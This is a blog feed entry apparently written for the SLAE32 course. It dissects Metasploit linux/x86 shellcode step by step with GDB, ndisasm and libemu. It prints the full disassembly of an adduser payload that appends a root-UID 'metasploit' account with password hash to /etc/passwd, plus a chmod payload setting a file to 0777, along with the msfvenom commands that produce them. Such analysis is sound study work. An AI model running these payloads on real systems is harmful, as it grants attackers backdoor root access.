<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2022-10-09T11:50:48+02:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Jeremy Catelain</title><subtitle>Write an awesome description for your new site here. You can edit this line in _config.yml. It will appear in your document head meta (for Google search results) and in your feed.xml site description.</subtitle><entry><title type="html">SLAE32</title><link href="http://localhost:4000/slae32/2022/10/05/Assign5-Msfpayload.html" rel="alternate" type="text/html" title="SLAE32" /><published>2022-10-05T08:45:58+02:00</published><updated>2022-10-05T08:45:58+02:00</updated><id>http://localhost:4000/slae32/2022/10/05/Assign5-Msfpayload</id><content type="html" xml:base="http://localhost:4000/slae32/2022/10/05/Assign5-Msfpayload.html">&lt;h3 id=&quot;-description-of-the-assignment-&quot;&gt;&lt;span style=&quot;color:#2d8fb3;&quot;&gt; Description of the assignment &lt;/span&gt;&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;Take up at least 3 shellcode samples created using Msfpayload for linux/x86&lt;/li&gt;
  &lt;li&gt;Use GDB/NDisasm/Libemu to dissect the functionality of the shellcode&lt;/li&gt;
  &lt;li&gt;Present your analysis&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;We are going to analyse together the following shellcodes:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;linux/x86/adduser&lt;/li&gt;
  &lt;li&gt;linux/x86/exec&lt;/li&gt;
  &lt;li&gt;linux/x86/meterpreter/reverse_tcp -TO SUPP&lt;/li&gt;
  &lt;li&gt;linux/x86/chmod&lt;/li&gt;
&lt;/ul&gt;

&lt;!--more--&gt;

&lt;h3 id=&quot;-part-1---linuxx86adduser-shellcode-&quot;&gt;&lt;span style=&quot;color:#2d8fb3;&quot;&gt; Part 1 - linux/x86/adduser shellcode &lt;/span&gt;&lt;/h3&gt;

&lt;h4 id=&quot;-principle-&quot;&gt;&lt;span style=&quot;color:#01416C;&quot;&gt; Principle &lt;/span&gt;&lt;/h4&gt;

&lt;p&gt;This first shellcode creates a user named ‘metasploit’ with the password ‘metasploit’.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;metasploit:metasploit
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;To analyse the shellcode we use ndisasm to display the instructions as follows :&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msfvenom -p linux/x86/adduser R | ndisasm -u -
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;Code result :&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;00000000  31C9              xor ecx,ecx
00000002  89CB              mov ebx,ecx
00000004  6A46              push byte +0x46
00000006  58                pop eax
00000007  CD80              int 0x80 // setreuid
00000009  6A05              push byte +0x5
0000000B  58                pop eax
0000000C  31C9              xor ecx,ecx
0000000E  51                push ecx
0000000F  6873737764        push dword 0x64777373
00000014  682F2F7061        push dword 0x61702f2f
00000019  682F657463        push dword 0x6374652f
0000001E  89E3              mov ebx,esp
00000020  41                inc ecx
00000021  B504              mov ch,0x4
00000023  CD80              int 0x80 // Open
00000025  93                xchg eax,ebx
00000026  E828000000        call 0x53
0000002B  6D                insd
0000002C  657461            gs jz 0x90
0000002F  7370              jnc 0xa1
00000031  6C                insb
00000032  6F                outsd
00000033  69743A417A2F6449  imul esi,[edx+edi+0x41],dword 0x49642f7a
0000003B  736A              jnc 0xa7
0000003D  3470              xor al,0x70
0000003F  3449              xor al,0x49
00000041  52                push edx
00000042  633A              arpl [edx],di
00000044  303A              xor [edx],bh
00000046  303A              xor [edx],bh
00000048  3A2F              cmp ch,[edi]
0000004A  3A2F              cmp ch,[edi]
0000004C  62696E            bound ebp,[ecx+0x6e]
0000004F  2F                das
00000050  7368              jnc 0xba
00000052  0A598B            or bl,[ecx-0x75]
00000055  51                push ecx
00000056  FC                cld
00000057  6A04              push byte +0x4
00000059  58                pop eax
0000005A  CD80              int 0x80 //
0000005C  6A01              push byte +0x1
0000005E  58                pop eax
0000005F  CD80              int 0x80 //
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;-execution-of-the-shellcode-&quot;&gt;&lt;span style=&quot;color:#01416C;&quot;&gt; Execution of the shellcode &lt;/span&gt;&lt;/h4&gt;

&lt;p&gt;The first thing we will try is to exploit the executable to see the result:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/slae32-img/assignment5/assignment5.1.PNG&quot; alt=&quot;drawing&quot; style=&quot;width:900px;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;em&gt;Note: Be careful with unknown shellcodes.&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;And when we search into the /etc/passwd file, we can see that the user has been well added as we can see:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;metasploit:Az/dIsj4p4IRc:0:0::/:/bin/sh
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Then we will look into more details about this shellcode.&lt;/p&gt;

&lt;h4 id=&quot;-1---setreuid-&quot;&gt;&lt;span style=&quot;color:#01416C;&quot;&gt; 1 - setreuid &lt;/span&gt;&lt;/h4&gt;

&lt;p&gt;The first instructions passed are as follows:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    00000000  31C9              xor ecx,ecx
    00000002  89CB              mov ebx,ecx
    00000004  6A46              push byte +0x46
    00000006  58                pop eax
    00000007  CD80              int 0x80
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/slae32-img/assignment5/assignment5.8.PNG&quot; alt=&quot;drawing&quot; style=&quot;width:900px;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;And the registers passed to that syscall are:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;EAX = 0x46 which is 70 in decimal&lt;/li&gt;
  &lt;li&gt;EBX = 0&lt;/li&gt;
  &lt;li&gt;ECX = 0&lt;/li&gt;
  &lt;li&gt;EDX = 0&lt;/li&gt;
  &lt;li&gt;ESI = 0&lt;/li&gt;
  &lt;li&gt;EDI = 0&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;So when we look at the syscall number 70 into “/usr/include/x86_64-linux-gnu/asm/unistd_32.h” and we get the setreuid syscall:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Documents/adduser# cat /usr/include/x86_64-linux-gnu/asm/unistd_32.h | grep 70
#define __NR_setreuid 70
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;Details of the syscall:&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;setreuid - set real and/or effective user ID
int setreguid(uid_t ruid, uid_t euid);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The analysis shows a setruid call with a real and effective user ID set to 0. By doing that, a privilege elevation is performed. Indeed, it changes the user ID of the user who launch the shellcode to 0 which corresponds to the root user ID.&lt;/p&gt;

&lt;h4 id=&quot;--2---open-&quot;&gt;&lt;span style=&quot;color:#01416C;&quot;&gt;  2 - Open &lt;/span&gt;&lt;/h4&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;00000009  6A05              push byte +0x5
0000000B  58                pop eax
0000000C  31C9              xor ecx,ecx
0000000E  51                push ecx
0000000F  6873737764        push dword 0x64777373 // dwss
00000014  682F2F7061        push dword 0x61702f2f // ap//
00000019  682F657463        push dword 0x6374652f // cte/
0000001E  89E3              mov ebx,esp
00000020  41                inc ecx
00000021  B504              mov ch,0x4
00000023  CD80              int 0x80
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/slae32-img/assignment5/assignment5.9.PNG&quot; alt=&quot;drawing&quot; style=&quot;width:900px&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The registers passed to that syscall are:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;EAX = 0x5 (Open syscall)&lt;/li&gt;
  &lt;li&gt;EBX = /etc//passwd&lt;/li&gt;
  &lt;li&gt;ECX = 0x401&lt;/li&gt;
  &lt;li&gt;EDX = 0&lt;/li&gt;
  &lt;li&gt;ESI = 0&lt;/li&gt;
  &lt;li&gt;EDI = 0&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;So when look at the syscall number 5 we get the setreuid call :&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#define __NR_open 5
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Syscall details:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;open - open and possibly create a file
int open(const char *pathname, int flags)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;EBX - Explanation&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;If we look at the push performed and then move into the EBX register, we can see that the values as follows are pushed:&lt;/p&gt;

&lt;p&gt;push dword 0x64777373 // dwss
push dword 0x61702f2f // ap//
push dword 0x6374652f // cte/&lt;/p&gt;

&lt;p&gt;Because of the little endian, the values are inversed but if we put them in the other way, it becomes “/etc//passwd”. 
And with the push ECX performed before, the value of EBX becomes /etc//passwd0x00.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;ECX - Explanation:&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;em&gt;Technic 1&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;The easiest way to find the flags parameters passed to the ECX registers is to use the tool strace.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Documents/adduser# strace ./adduser 2&amp;gt;&amp;amp;1 | grep open
open(&quot;/etc//passwd&quot;, O_WRONLY|O_APPEND) = 3
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;It displays the paramters O_WRONLY and O_APPEND have been passed to the open function.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;em&gt;Technic 2&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;The second technic is by looking at the value 0x401 passed to ECX.
If we try to convert the value in decimal, it gives 2001 as we can see:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Documents/PentesterAcademy/SLAE32-Exam/assignment5/chmod# printf &quot;%o\n&quot; 0x401
2001
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;To find the corresponding flags, we have to look into the /usr/include/asm-generic/fcntl.h file and as we can see it confirms that the flag values are:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#define O_WRONLY	00000001 
#define O_APPEND	00002000
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;For the first one, the detail in the man 2 open page shows:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;The argument flags must include one of the following access modes: O_RDONLY, O_WRONLY, or O_RDWR. 
These request opening the file read-only, write-only, or read/write, respectively.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;And for the second one, the details in the man 2 open page shows:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;O_APPEND
    The  file  is  opened in append mode.  Before each write(2), the file offset is posi‐
    tioned at the end of the file, as if with lseek(2).  The  modification  of  the  file
    offset and the write operation are performed as a single atomic step.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;So, by specifying the O_WRONLY and the O_APPEND flags, the file permissions set are respectively the write only and the writing of the data at the end of the file.&lt;/p&gt;

&lt;h4 id=&quot;--3---jmp-call-pop-&quot;&gt;&lt;span style=&quot;color:#01416C;&quot;&gt;  3 - JMP-CALL-POP &lt;/span&gt;&lt;/h4&gt;

&lt;p&gt;In the instruction section, we can see the following instructions:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;00000025  93                xchg eax,ebx
00000026  E828000000        call 0x53
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;So to better understand the behavior, we look at it into GDB which gave the following instructions:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0x8048079:	xchg   ebx,eax
0x804807a:	call   0x80480a7
0x80480a7:	pop    ecx
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The first instruction store the file descriptor into EAX. Then, as we could see into GDB, the JMP-CALL-POP technic is used to retrive the address of the string that needs to be inserted into the /etc/passwd file. The last instruction store the address of the following value :&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ECX: 0x804807f (&quot;metasploit:Az/dIsj4p4IRc:0:0::/:/bin/sh\nY\213Q\374j\004X̀j\001X̀&quot;)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;-4---write-&quot;&gt;&lt;span style=&quot;color:#01416C;&quot;&gt; 4 - Write &lt;/span&gt;&lt;/h4&gt;

&lt;p&gt;Then in GDB, we display the newt instructions :&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0x80480a8:	mov    edx,DWORD PTR [ecx-0x4] // Length
0x80480ab:	push   0x4
0x80480ad:	pop    eax
0x80480ae:	int    0x80
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/slae32-img/assignment5/assignment5.7.PNG&quot; alt=&quot;drawing&quot; style=&quot;width:900px&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As we can see the register values are:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;EAX = 0x4 // Write Syscall&lt;/li&gt;
  &lt;li&gt;EBX = 0x3 // File descriptor&lt;/li&gt;
  &lt;li&gt;ECX = 0x804807f // Address of the values to write&lt;/li&gt;
  &lt;li&gt;EDX = 0x28 // 40 in decimal&lt;/li&gt;
  &lt;li&gt;ESI = 0&lt;/li&gt;
  &lt;li&gt;EDI = 0&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;So when we look at the syscall number 4 into “/usr/include/x86_64-linux-gnu/asm/unistd_32.h” and we get the write syscall:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Documents/adduser# cat /usr/include/x86_64-linux-gnu/asm/unistd_32.h | grep 4
#define __NR_write 4
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;man 2 write result:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ssize_t write(int fd, const void *buf, size_t count);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;So, this syscall write in the /etc/passwd file the string ‘metasploit:Az/dIsj4p4IRc:0:0:: /:/bin/sh\n’’ with a length of 40.&lt;/p&gt;

&lt;h4 id=&quot;-5---exit-&quot;&gt;&lt;span style=&quot;color:#01416C;&quot;&gt; 5 - Exit &lt;/span&gt;&lt;/h4&gt;

&lt;p&gt;GDB displayed the final instructions as follows:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0x80480b0:	push   0x1
0x80480b2:	pop    eax
0x80480b3:	int    0x80
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/slae32-img/assignment5/assignment5.10.PNG&quot; alt=&quot;drawing&quot; style=&quot;width:900px&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As we can see the register values are:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;EAX = 0x1 // Exit Syscall&lt;/li&gt;
  &lt;li&gt;EBX = 0x3 // File descriptor&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;So, we look into the unistd_32.h file to find the corresponding syscall and it seems that is is an Exit syscall.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Documents/PentesterAcademy/SLAE32-Exam/assignment5/adduser# cat /usr/include/x86_64-linux-gnu/asm/unistd_32.h | grep 1
#define __NR_exit 1_
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Result : 
The final instruction perform an Exit syscall and it let a random value for the status parameter.&lt;/p&gt;

&lt;h3 id=&quot;-part-2---linuxx86chmod-shellcode-&quot;&gt;&lt;span style=&quot;color:#2d8fb3;&quot;&gt; Part 2 - linux/x86/chmod shellcode &lt;/span&gt;&lt;/h3&gt;

&lt;h4 id=&quot;-principle--1&quot;&gt;&lt;span style=&quot;color:#01416C;&quot;&gt; Principle &lt;/span&gt;&lt;/h4&gt;

&lt;p&gt;This linux/x86/chmod shellcode runs a chmod command on a specified file with specified mode.&lt;/p&gt;

&lt;p&gt;To analyze the shellcode purpose, the file “restrictedfile” is created with the specifications as follows:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Documents/PentesterAcademy/SLAE32-Exam/assignment5/chmod# ls -l /etc/restrictedfile 
-rw-r--r-- 1 root root 0 févr. 16 20:44 /etc/restrictedfile
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The rights attributed to the file are initially 0644 and in this exercise, we are going to analyse a shellcode which change them to 0777.&lt;/p&gt;

&lt;p&gt;To make sure that the shellcode works, we created it shellcode and executed it:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/slae32-img/assignment5/assignment5.11.PNG&quot; alt=&quot;drawing&quot; style=&quot;width:900px&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As we can see, the rights on the file have been changed successfully.&lt;/p&gt;

&lt;h4 id=&quot;-analysis-&quot;&gt;&lt;span style=&quot;color:#01416C;&quot;&gt; Analysis &lt;/span&gt;&lt;/h4&gt;

&lt;p&gt;To analyse the shellcode we can use several technics.
First, we can use directly GDB to go step by step and stop (break) at each syscall and look at the register’s values.&lt;/p&gt;

&lt;p&gt;Then, we can used the libemu/tools/sctest script to analyse it:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msfvenom -p linux/x86/chmod R | /opt/hackingtools/libemu/tools/sctest/sctest -vvv -Ss 100000
        -S : read shellcode from stdin
        -s : how much of the shellcode we would like to run (100000 =&amp;gt; to have all the shellcode executed)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;And, we used the graphical option to help to visualize it:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msfvenom -p linux/x86/chmod FILE=/etc/restrictedfile MODE=0777 R | /opt/hackingtools/libemu/tools/sctest/sctest -vvv -Ss 100000 -G chmod.dot
//Then convert into PNG file :
dot chmod.dot -Tpng -o chmod.png
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Finally, we can display the instruction with the following command line:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msfvenom -p linux/x86/chmod FILE=/etc/restrictedfile MODE=0777 R | ndisasm -u -
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;In this assessment, we will use all of those technic to be more accurate on the actions performed.&lt;/p&gt;

&lt;p&gt;Shellcode instructions:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0x8048054:	cdq    
0x8048055:	push   0xf
0x8048057:	pop    eax
0x8048058:	push   edx
0x8048059:	call   0x8048072
0x804805e:	das    
0x804805f:	gs je  0x80480c5
0x8048062:	das    
0x8048063:	jb     0x80480ca
0x8048065:	jae    0x80480db
0x8048067:	jb     0x80480d2
0x8048069:	arpl   WORD PTR [ebp+eiz*2+0x64],si
0x804806d:	imul   bp,WORD PTR [ebp+eiz*2+0x0],0x685b
0x8048074:	inc    DWORD PTR [ecx]
0x8048076:	add    BYTE PTR [eax],al
0x8048078:	pop    ecx
0x8048079:	int    0x80
0x804807b:	push   0x1
0x804807d:	pop    eax
0x804807e:	int    0x80
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;-1---chmod-&quot;&gt;&lt;span style=&quot;color:#01416C;&quot;&gt; 1 - CHMOD &lt;/span&gt;&lt;/h4&gt;

&lt;p&gt;The first instruction are as follows :&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0x8048054:	cdq    
0x8048055:	push   0xf // decimal value = 15
0x8048057:	pop    eax
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;As we can see, the hexadecimal value 0xf (15 in decimal) is poped into the EAX register. We searched for the syscall associated to the decimal value 15 and we found that it corresponds to the chmod syscall.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Documents/PentesterAcademy/SLAE32-Exam/assignment5/chmod# cat /usr/include/x86_64-linux-gnu/asm/unistd_32.h | grep 15
#define __NR_chmod 15
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Syscall details:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;chmod - change permissions of a file
int chmod(const char *pathname, mode_t mode);    
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We can see that the chmod function is constituted as follows:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;*pathname: Pointer pointing to the string of the targeted file pathname;&lt;/li&gt;
  &lt;li&gt;mode: Mode to apply to the file.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;The technic of the jump call pop is used to retrive the address of the string “/etc/restricted” as we can see:&lt;/p&gt;

&lt;p&gt;Call instruction:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/slae32-img/assignment5/assignment5.13.PNG&quot; alt=&quot;drawing&quot; style=&quot;width:900px&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Pop Instruction:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/slae32-img/assignment5/assignment5.14.PNG&quot; alt=&quot;drawing&quot; style=&quot;width:900px&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Address of the string “/etc/restricted” strored into the register EBX:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/slae32-img/assignment5/assignment5.15.PNG&quot; alt=&quot;drawing&quot; style=&quot;width:900px&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Then the next step is to set up the second parameter “mode”. 
The next instructions showed by GDB are as follows:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/slae32-img/assignment5/assignment5.16.PNG&quot; alt=&quot;drawing&quot; style=&quot;width:900px&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As we can see, it pop into the ECX register the value “0x1ff” which correspond to the decimal value 777 that we specified in an option of our shellcode.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Documents/PentesterAcademy/SLAE32-Exam/assignment5/chmod# printf &quot;%o\n&quot; 0x1ff
777
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Then, at the syscall instruction (0x80), it gives the following state:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/slae32-img/assignment5/assignment5.17.PNG&quot; alt=&quot;drawing&quot; style=&quot;width:900px&quot; /&gt;&lt;/p&gt;

&lt;p&gt;With the registers:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;EAX = 0xf // decimal value 15 for the chmod syscall&lt;/li&gt;
  &lt;li&gt;EBX = 0x804805e (“/etc/restrictedfile”) // address of the string of the file&lt;/li&gt;
  &lt;li&gt;ECX = 0x1ff // decimal value 777 for the mode&lt;/li&gt;
&lt;/ul&gt;

&lt;h6 id=&quot;exit&quot;&gt;Exit&lt;/h6&gt;

&lt;p&gt;Finally the last instructions are as follows:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/slae32-img/assignment5/assignment5.18.PNG&quot; alt=&quot;drawing&quot; style=&quot;width:900px&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We can see that the value 0x1 is passed to the EAX register. 
By looking at the corresponding sycall in the unistd_32.h file, we find out that it corresponds to the exit syscall.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Documents/PentesterAcademy/SLAE32-Exam/assignment5/chmod# cat /usr/include/x86_64-linux-gnu/asm/unistd_32.h | grep 1
#define __NR_exit 1
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Details of the Exit syscall:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;_exit, terminate the calling process
#include &amp;lt;unistd.h&amp;gt;
void _exit(int status);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Finally, we can see in the last instruction that only the EAX register has been changed because the status parameter required is only used to return a state to the parent process which is not required in our case.&lt;/p&gt;

